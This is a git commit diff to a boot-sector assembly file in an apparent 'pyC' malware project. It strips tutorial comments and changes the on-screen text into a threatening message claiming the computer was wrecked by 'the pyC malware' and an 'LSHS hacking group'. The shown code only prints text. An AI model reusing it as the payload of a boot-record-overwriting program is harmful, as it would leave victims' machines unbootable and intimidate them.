049eb1c4d0bf21d8eddd77291ca09b4823c5af39
Lovely Disease <83523587+CPScript@users.noreply.github.com>
2023-09-28 17:13:50 -0400

    Update boot.asm

--- file/pyC/boot.asm
+++ file/pyC/boot.asm
@@ -1,7 +1,3 @@
-; Here we are in assembly!
-; This program will display a simple string, which must be NULL terminated in order to properly 
-; find the length of it.
-
 ; First of all, we need to define the base.
 org 0x7c00 ; The base of the program
 bits 16    ; 16 bits
@@ -48,16 +44,7 @@ cls:
 	int 0x10       ; Call the BIOS interrupt!
 	ret            ; Return
 
-display db "Your system has been destroyed!", 13, 10, "Like & Subscribe!", 13, 10, 0 ; The null terminator is very important!
+display db "UH OH!", 13, 10, " ",13 ,10, " ",13 ,10, "Your computer has been fucked over by the pyC malware", 13, 10, "We will not forgive. If your seeing this than this is your warning", 13, 10, "By the LSHS hacking group", 13, 10, 0 ; The null terminator is very important!
 times 510 - ($ - $$) db 0 ; Zero remaining sectors
 dw 0xaa55 ; Bootable signature
 
-; Now let's try the program!
-; Nice! Let's try changing the color of the text!
-; Now let's try making a new line. We can not use "\n" since no such escapes are defined.
-; Instead, we'll have to use the raw number of it. \n's raw number is 10.
-; What happened? It did create a new line, however it continued moving forward along the horizontal axis.
-; This is because the \n character actually isn't a single character, (It is, however it can't be printed alone).
-; We need a vertical return character as well, \r, which returns the horizontal axis.
-; The raw number of the vertical return character is 13. Now let's try it!
-; It works!
